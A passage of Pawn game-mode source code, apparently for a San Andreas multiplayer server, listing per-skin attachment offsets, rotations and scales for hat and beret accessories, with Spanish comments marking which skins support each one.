	{ 0.125000, -0.009999, -0.009999, 0.000000, 0.000000, 350.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 273 || Hat1 - NO.
	{ 0.132041, -0.007365, -0.008634, 0.000000, 0.000000, 341.057495, 0.965551, 1.000000, 0.919670 }, // SKINID 274 || Hat1 - SI.
	{ 0.132041, -0.007365, -0.008634, 0.000000, 0.000000, 341.057495, 0.965551, 1.000000, 0.948305 }, // SKINID 275 || Hat1 - SI.
	{ 0.132041, 0.000721, -0.008634, 0.000000, 0.000000, 341.057495, 0.965551, 1.000000, 0.948305 }, // SKINID 276 || Hat1 - SI.
	{ 0.0, 0.000721, -0.008634, 0.000000, 0.000000, 341.057495, 0.965551, 1.000000, 0.948305 }, // SKINID 277 || Hat1 - NO.
	{ 0.0, 0.000721, -0.008634, 0.000000, 0.000000, 341.057495, 0.965551, 1.000000, 0.948305 }, // SKINID 278 || Hat1 - NO.
	{ 0.0, 0.000721, -0.008634, 0.000000, 0.000000, 341.057495, 0.965551, 1.000000, 0.948305 }, // SKINID 279 || Hat1 - NO.
	{ 0.133243, 0.000721, -0.008634, 0.000000, 0.000000, 341.057495, 0.965551, 1.000000, 0.948305 }, // SKINID 280 || Hat1 - SI.
	{ 0.133243, 0.000721, -0.008634, 0.000000, 0.000000, 341.057495, 0.965551, 1.000000, 0.948305 }, // SKINID 281 || Hat1 - SI.
	{ 0.133876, 0.000523, -0.008634, 0.000000, 0.000000, 341.057495, 1.152778, 1.000000, 1.020910 }, // SKINID 282 || Hat1 - SI.
	{ 0.0, 0.000523, -0.008634, 0.000000, 0.000000, 341.057495, 1.152778, 1.000000, 1.020910 }, // SKINID 283 || Hat1 - NO.
	{ 0.0, 0.000523, -0.008634, 0.000000, 0.000000, 341.057495, 1.152778, 1.000000, 1.020910 }, // SKINID 284 || Hat1 - NO.
	{ 0.0, 0.000523, -0.008634, 0.000000, 0.000000, 341.057495, 1.152778, 1.000000, 1.020910 }, // SKINID 285 || Hat1 - NO.
	{ 0.129142, 0.000523, -0.008634, 0.000000, 0.000000, 341.057495, 1.152778, 1.000000, 1.020910 }, // SKINID 286 || Hat1 - SI.
	{ 0.0, 0.000523, -0.008634, 0.000000, 0.000000, 341.057495, 1.152778, 1.000000, 1.020910 }, // SKINID 287 || Hat1 - NO.
	{ 0.0, 0.000523, -0.008634, 0.000000, 0.000000, 341.057495, 1.152778, 1.000000, 1.020910 }, // SKINID 288 || Hat1 - NO.
	{ 0.0, 0.000523, -0.008634, 0.000000, 0.000000, 341.057495, 1.152778, 1.000000, 1.020910 }, // SKINID 289 || Hat1 - NO.
	{ 0.122872, -0.007010, -0.008634, 0.000000, 0.000000, 341.057495, 1.152778, 1.000000, 1.099102 }, // SKINID 290 || Hat1 - SI.
	{ 0.164891, -0.023199, -0.008634, 0.000000, 0.000000, 341.057495, 1.152778, 1.000000, 1.062029 }, // SKINID 291 || Hat1 - SI.
	{ 0.111781, -0.000514, -0.015303, 0.000000, 0.000000, 341.057495, 1.152778, 1.000000, 0.959454 }, // SKINID 292 || Hat1 - SI.
	{ 0.0, -0.000514, -0.015303, 0.000000, 0.000000, 341.057495, 1.152778, 1.000000, 0.959454 }, // SKINID 293 || Hat1 - No.
	{ 0.180277, -0.010770, -0.008173, 0.000000, 0.000000, 350.911071, 1.152778, 1.000000, 1.018012 }, // SKINID 294 || Hat1 - SI.
	{ 0.140434, -0.010770, -0.008173, 0.000000, 0.000000, 350.911071, 1.152778, 1.000000, 1.071541 }, // SKINID 295 || Hat1 - SI.
	{ 0.152344, -0.055147, -0.008173, 0.000000, 0.000000, 328.444580, 1.036304, 1.000000, 1.071541 }, // SKINID 296 || Hat1 - SI.
	{ 0.152344, -0.045099, -0.008173, 0.000000, 0.000000, 328.444580, 1.036304, 1.000000, 1.071541 }, // SKINID 297 || Hat1 - SI.
	{ 0.136437, -0.045099, -0.008173, 0.000000, 0.000000, 328.444580, 1.036304, 1.000000, 1.071541 }, // SKINID 298 || Hat1 - SI.
	{ 0.153677, -0.028657, -0.008173, 0.000000, 0.000000, 328.444580, 1.036304, 1.000000, 1.071541 }  // SKINID 299 || Hat1 - SI.
};
new Float:POS_Accesorio_Boina[300][9] = {
	{ 0.180261, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 0 || Beret1 - || BARET ||
	{ 0.180261, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 1 || Beret1 - || BARET ||
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 2 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 3 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 4 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 5 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 6 || Beret1 - NOOOOOOOOO
	{ 0.176095, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 7 || Beret1 -
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 8 || Beret1 - NOOOOOOOOO
	{ 0.149783, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 9 || Beret1 -
	{ 0.149783, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 10 || Beret1 -
	{ 0.149783, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 11 || Beret1 -
	{ 0.149783, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 12 || Beret1 -
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 13 || Beret1 - NOOOOOOOOO
	{ 0.149783, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 14 || Beret1 -
	{ 0.149783, -0.028243, -0.001220, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 15 || Beret1 -
	{ 0.0, -0.028243, -0.001220, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 16 || Beret1 - NOOOOOOOOO
	{ 0.156457, 0.001257, -0.001220, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 17 || Beret1 -
	{ 0.118533, 0.001257, -0.001220, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 18 || Beret1 -
	{ 0.0, 0.001257, -0.001220, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 19 || Beret1 - NOOOOOOOOO
	{ 0.183444, 0.001257, -0.001220, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 20 || Beret1 -
	{ 0.161830, 0.001257, -0.001220, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 21 || Beret1 -
	{ 0.0, 0.001257, -0.001220, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 22 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.001257, -0.001220, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 23 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.001257, -0.001220, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 24 || Beret1 - NOOOOOOOOO
	{ 0.161830, 0.001257, -0.001220, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 25 || Beret1
	{ 0.164234, 0.001257, -0.001220, 0.000000, 0.000000, 0.000000, 1.121118, 1.000000, 1.089123 }, // SKINID 26 || Beret1
	{ 0.0, 0.001257, -0.001220, 0.000000, 0.000000, 0.000000, 1.121118, 1.000000, 1.089123 }, // SKINID 27 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.001257, -0.001220, 0.000000, 0.000000, 0.000000, 1.121118, 1.000000, 1.089123 }, // SKINID 28 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.001257, -0.001220, 0.000000, 0.000000, 0.000000, 1.121118, 1.000000, 1.089123 }, // SKINID 29 || Beret1 - NOOOOOOOOO
	{ 0.164234, 0.001257, -0.001220, 0.000000, 0.000000, 0.000000, 1.121118, 1.000000, 1.089123 }, // SKINID 30 || Beret1 -
	{ 0.0, 0.001257, -0.001220, 0.000000, 0.000000, 0.000000, 1.121118, 1.000000, 1.089123 }, // SKINID 31 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.001257, -0.001220, 0.000000, 0.000000, 0.000000, 1.121118, 1.000000, 1.089123 }, // SKINID 32 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.001257, -0.001220, 0.000000, 0.000000, 0.000000, 1.121118, 1.000000, 1.089123 }, // SKINID 33 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.001257, -0.001220, 0.000000, 0.000000, 0.000000, 1.121118, 1.000000, 1.089123 }, // SKINID 34 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.001257, -0.001220, 0.000000, 0.000000, 0.000000, 1.121118, 1.000000, 1.089123 }, // SKINID 35 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.001257, -0.001220, 0.000000, 0.000000, 0.000000, 1.121118, 1.000000, 1.089123 }, // SKINID 36 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.001257, -0.001220, 0.000000, 0.000000, 0.000000, 1.121118, 1.000000, 1.089123 }, // SKINID 37 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.001257, -0.001220, 0.000000, 0.000000, 0.000000, 1.121118, 1.000000, 1.089123 }, // SKINID 38 || Beret1 - NOOOOOOOOO
	{ 0.131527, 0.001257, -0.001220, 0.000000, 0.000000, 0.000000, 1.121118, 1.000000, 1.089123 }, // SKINID 39 || Beret1 -
	{ 0.131527, 0.001257, -0.001220, 0.000000, 0.000000, 0.000000, 1.121118, 1.000000, 1.089123 }, // SKINID 40 || Beret1 -
	{ 0.0, 0.001257, -0.001220, 0.000000, 0.000000, 0.000000, 1.121118, 1.000000, 1.089123 }, // SKINID 41 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 42 || Beret1 - NOOOOOOOOO
	{ 0.104019, 0.001257, -0.001220, 0.000000, 0.000000, 0.000000, 1.121118, 1.000000, 1.089123 }, // SKINID 43 || Beret1 -
	{ 0.128697, 0.022019, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 44 || Beret1 -
	{ 0.128697, -0.008573, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 45 || Beret1 -
	{ 0.164191, 0.018399, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 46 || Beret1 -
	{ 0.164305, 0.020698, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 47 || Beret1 -
	{ 0.175181, -0.010091, 0.000000, 0.000000, 0.000000, 0.000000, 1.104145, 1.000000, 1.121630 }, // SKINID 48 || Beret1 -
	{ 0.146655, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 49 || Beret1 -
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 50 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 51 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 52 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 53 || Beret1 - NOOOOOOOOO
	{ 0.146655, 0.027900, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 54 || Beret1 -
	{ 0.146655, -0.002721, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 55 || Beret1 -
	{ 0.146655, -0.002721, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 56 || Beret1 -
	{ 0.171912, 0.008824, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 57 || Beret1 -
	{ 0.151101, -0.008750, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 58 || Beret1 -
	{ 0.151390, 0.005085, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 59 || Beret1 -
	{ 0.151390, 0.005085, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 60 || Beret1 -
	{ 0.0, 0.005085, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 61 || Beret1 - NOOOOOOOOO
	{ 0.151390, 0.028324, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 62 || Beret1 -
	{ 0.170077, -0.002114, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 63 || Beret1 -
	{ 0.140552, -0.002114, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 64 || Beret1 -
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 65 || Beret1 - NOOOOOOOOO
	{ 0.140552, 0.026128, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 66 || Beret1 -
	{ 0.0, 0.026128, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 67 || Beret1 - NOOOOOOOOO
	{ 0.151242, 0.019900, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 68 || Beret1 -
	{ 0.159290, -0.005815, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 69 || Beret1 -
	{ 0.159290, 0.010538, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 70 || Beret1 -
	{ 0.0, 0.010538, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 71 || Beret1 - NOOOOOOOOO
	{ 0.159290, 0.010538, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 72 || Beret1 -
	{ 0.0, 0.010538, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 73 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 74 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.010538, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 75 || Beret1 - NOOOOOOOOO
	{ 0.159290, -0.008761, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 76 || Beret1 -
	{ 0.0, -0.008761, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 77 || Beret1 - NOOOOOOOOO
	{ 0.0, -0.008761, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 78 || Beret1 - NOOOOOOOOO
	{ 0.0, -0.008761, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 79 || Beret1 - NOOOOOOOOO
	{ 0.136051, -0.008761, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 80 || Beret1 -
	{ 0.136051, -0.008761, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 81 || Beret1 -
	{ 0.195115, 0.023367, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 82 || Beret1 -
	{ 0.195115, 0.023367, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 83 || Beret1 -
	{ 0.195115, 0.011881, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 84 || Beret1 -
	{ 0.195115, 0.011881, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 85 || Beret1 -
	{ 0.0, 0.011881, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 86 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.011881, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 87 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.011881, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 88 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.011881, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 89 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.011881, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 90 || Beret1 - NOOOOOOOOO
	{ 0.177857, -0.011357, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 91 || Beret1 -
	{ 0.0, -0.011357, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 92 || Beret1 - NOOOOOOOOO
	{ 0.177857, -0.011357, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 93 || Beret1 -
	{ 0.0, -0.011357, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 94 || Beret1 - NOOOOOOOOO
	{ 0.160671, -0.019439, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 95 || Beret1 -
	{ 0.181481, -0.001912, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 96 || Beret1 -
	{ 0.164224, -0.001912, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 97 || Beret1 -
	{ 0.177388, 0.011110, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 98 || Beret1 -
	{ 0.0, 0.011110, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 99 || Beret1 - NOOOOOOOOO
	{ 0.173578, 0.011110, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 100 || Beret1 -
	{ 0.174914, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 101 || Beret1 -
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 102 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 103 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 104 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 105 || Beret1 - NOOOOOOOOO
	{ 0.174914, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 106 || Beret1 -
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 107 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 108 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 109 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 110 || Beret1 - NOOOOOOOOO
	{ 0.174914, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 111 || Beret1 -
	{ 0.135964, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 112 || Beret1 -
	{ 0.176390, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 113 || Beret1 -
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 114 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 115 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 116 || Beret1 - NOOOOOOOOO
	{ 0.145224, 0.017181, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 117 || Beret1 -
	{ 0.145224, 0.017181, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 118 || Beret1 -
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 119 || Beret1 - NOOOOOOOOO
	{ 0.160884, 0.005099, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 120 || Beret1 -
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 121 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.005099, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 122 || Beret1 - NOOOOOOOOO
	{ 0.168759, 0.005099, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 123 || Beret1 -
	{ 0.168759, 0.005099, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 124 || Beret1 -
	{ 0.168759, 0.005099, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 125 || Beret1 -
	{ 0.168759, -0.009978, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 126 || Beret1 -
	{ 0.168759, 0.001810, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 127 || Beret1 -
	{ 0.168759, 0.025049, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 128 || Beret1 -
	{ 0.0, 0.025049, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 129 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.025049, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 130 || Beret1 - NOOOOOOOOO
	{ 0.146233, -0.002107, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 131 || Beret1 -
	{ 0.062156, -0.002107, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 132 || Beret1 -
	{ 0.0, -0.002107, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 133 || Beret1 - NOOOOOOOOO
	{ 0.0, -0.002107, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 134 || Beret1 - NOOOOOOOOO
	{ 0.0, -0.002107, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 135 || Beret1 - NOOOOOOOOO
	{ 0.0, -0.002107, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 136 || Beret1 - NOOOOOOOOO
	{ 0.0, -0.002107, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 137 || Beret1 - NOOOOOOOOO
	{ 0.154004, 0.004867, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 138 || Beret1 -
	{ 0.154004, 0.004867, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 139 || Beret1 -
	{ 0.154004, 0.004867, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 140 || Beret1 -
	{ 0.169024, 0.004867, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 141 || Beret1 -
	{ 0.0, 0.004867, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 142 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.004867, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 143 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 144 || Beret1 - NOOOOOOOOO
	{ 0.175224, 0.000106, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 145 || Beret1 -
	{ 0.175224, 0.000106, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 146 || Beret1 -
	{ 0.175224, -0.013702, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 147 || Beret1 -
	{ 0.175224, -0.013702, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 148 || Beret1 -
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 149 || Beret1 - NOOOOOOOOO
	{ 0.175224, -0.013702, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 150 || Beret1 -
	{ 0.175224, -0.013702, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 151 || Beret1 -
	{ 0.175224, -0.013702, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 152 || Beret1 -
	{ 0.0, -0.013702, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 153 || Beret1 - NOOOOOOOOO
	{ 0.119687, -0.013702, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 154 || Beret1 -
	{ 0.0, -0.013702, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 155 || Beret1 - NOOOOOOOOO
	{ 0.180860, -0.013702, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 156 || Beret1 -
	{ 0.147001, 0.012013, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 157 || Beret1 -
	{ 0.0, 0.012013, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 158 || Beret1 - NOOOOOOOOO
	{ 0.0, 0.012013, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 159 || Beret1 - NOOOOOOOOO
	{ 0.147001, 0.012013, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 160 || Beret1 -
	{ 0.0, 0.012013, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 161 || Beret1 - NOOOOOOOOO
